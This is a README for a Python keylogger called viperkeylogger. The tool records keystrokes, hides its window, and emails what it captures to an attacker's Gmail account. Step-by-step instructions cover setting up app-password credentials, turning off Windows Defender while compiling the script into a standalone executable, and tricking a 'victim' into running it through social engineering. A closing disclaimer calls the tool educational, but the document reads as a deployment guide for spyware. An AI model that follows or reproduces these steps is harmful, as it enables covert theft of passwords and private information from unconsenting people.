# viperkeylogger

Capture Keystrokes from target's machine.

# What is Keylogger?

A computer program that records every keystroke made by a computer user, especially in order to gain fraudulent access to passwords and other confidential information.

# How viperkeylogger works?

Its based on Smtp. where the keystrokes are send as mails to the attackers mail. The viperkeylogger is a python script where we use modules like pynput to capture the keyboard strokes. viperkeylogger also uses win32gui,win32con to automatically hide itself. 

# Steps

Step 1: Get your gmail and App password.

App password is given in "Manage your google Account" --> "Security" --> "App passwords" --> "Select app" --> "Other (Custom name)" --> (give some name) --> (Copy that given code).

Step 2: To make changes in python file (i.e viperkeylogger.py).

Open the python file go to email="" add your email where you want to receive the keystrokes.
Then add the copied App password in password="".
Ex: email="abc@gmail.com"
    password="hkwehnjioewhfiwo"
Also set char_limit to how many characters you want in single mail.

Step 3: Compile the file as .exe using nuitka.

You have to install nuitka from nuitka.net.
Install pynput by exicuting this command in cmd "pip install pynput".
Open powershell go to the directory where the code exists and run the following command which creates the keylogger exe file.
*Please Turn off realtime protection of windows defender while compiling.

py -m nuitka --mingw64 .\viperkeylogger.py --standalone --onefile

Step 4: 

Make victim Open the file in any method. (Ex: Social engineering etc...)

# This code DOES NOT promote or encourage any illegal activities! This content provided is just for educational purposes and to create awareness!

viperkeylogger is created to help in penetration testing and it's not responsible for any misuse or illegal purposes.
